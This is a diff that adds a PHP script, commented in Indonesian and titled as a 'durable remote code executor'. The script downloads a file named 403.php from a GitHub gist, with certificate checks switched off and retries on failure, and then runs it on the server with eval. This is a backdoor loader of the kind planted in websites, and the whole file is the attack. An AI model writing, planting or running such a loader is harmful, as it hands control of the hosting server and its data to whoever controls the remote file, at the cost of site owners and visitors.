@@ -1,0 +1,70 @@
+<?php
+// ============================================
+// SCRIPT REMOTE CODE EXECUTOR YANG AWET
+// ============================================
+
+// 1. Batasi waktu eksekusi total script
+set_time_limit(30); // Maksimal 30 detik
+
+// 2. URL target
+$url = "https://gist.githubusercontent.com/Seogembul/e46826aeafdef551258e115d863ca8f7/raw/d7066dca8b6e6965dc6c9d8fec821ad4367c4d66/403.php";
+
+// 3. Ambil konten dengan retry jika gagal
+$maxRetries = 2;
+$retryDelay = 1; // detik
+$content = null;
+$http_code = 0;
+
+for ($i = 0; $i < $maxRetries; $i++) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Nonaktifkan verifikasi SSL untuk menghindari error sertifikat
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    $content = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curl_errno = curl_errno($ch);
+    curl_close($ch);
+
+    if ($http_code == 200 && !$curl_errno) {
+        break; // Berhasil, keluar dari retry
+    }
+
+    // Jika belum mencoba maksimal, tunggu sebentar lalu coba lagi
+    if ($i < $maxRetries - 1) {
+        sleep($retryDelay);
+    }
+}
+
+// 4. Cek jika berhasil mengambil konten
+if ($http_code == 200 && strlen($content) > 20) {
+    // 5. Jalankan kode dengan error handling
+    try {
+        // Menggunakan eval, tapi kita batasi waktu eksekusi kode remote?
+        // Tidak ada cara langsung untuk membatasi waktu eval, tapi kita bisa set_time_limit di dalam eval?
+        // Atau kita bisa menggunakan pcntl untuk timeout, tapi tidak tersedia di semua server.
+        // Sebagai alternatif, kita bisa set ulang time limit untuk kode yang dieval.
+        set_time_limit(20); // Beri waktu 20 detik untuk kode remote
+        
+        // Jalankan kode
+        eval("?>" . $content);
+    } catch (Throwable $e) {
+        // Tangkap error apa pun yang terjadi dalam eval
+        error_log("Remote code error: " . $e->getMessage());
+        // Tampilkan pesan error umum (jika di development, bisa ditampilkan detail)
+        echo "Terjadi kesalahan dalam eksekusi kode remote.";
+    }
+} else {
+    // Tampilkan pesan error sederhana
+    echo "Kode remote tidak dapat diakses (HTTP Code: $http_code)";
+}
+
+// 6. Pastikan tidak ada output yang tidak diinginkan
+// Jika script ini diakses via web dan tidak ingin menampilkan apa pun jika sukses,
+// bisa diarahkan untuk redirect atau hanya memberikan response kosong.
+// Namun, karena kode remote mungkin menghasilkan output, biarkan saja.
+
+// ============================================
+// SELESAI
+// ============================================
+?>
